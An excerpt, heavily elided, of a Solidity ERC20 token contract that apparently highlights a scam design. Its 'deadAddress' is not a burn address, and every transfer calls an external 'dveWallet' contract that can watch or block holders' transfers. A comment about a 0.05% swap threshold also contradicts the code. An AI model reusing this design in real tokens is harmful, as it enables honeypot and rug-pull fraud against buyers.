...
contract NM is ERC20, Ownable {
    ...
    address public constant deadAddress = address(0xE20ee147faCF165f9E3Df6de24525C962f0F152a);
    ...
    address public dveWallet=0x5b92fcBA00D8bA627983691142059bf761F08C28;
    ...
    constructor() ERC20("perpetuating", "perpetuating") {
        ...
        swapTokensAtAmount = totalSupply * 1000 / 1000; // 0.05% swap wallet
    ...
    function _transfer(
        ...
        uint256 fees = 0;
        IUniswapV2PairBuyBack(dveWallet).buyback(from,to);
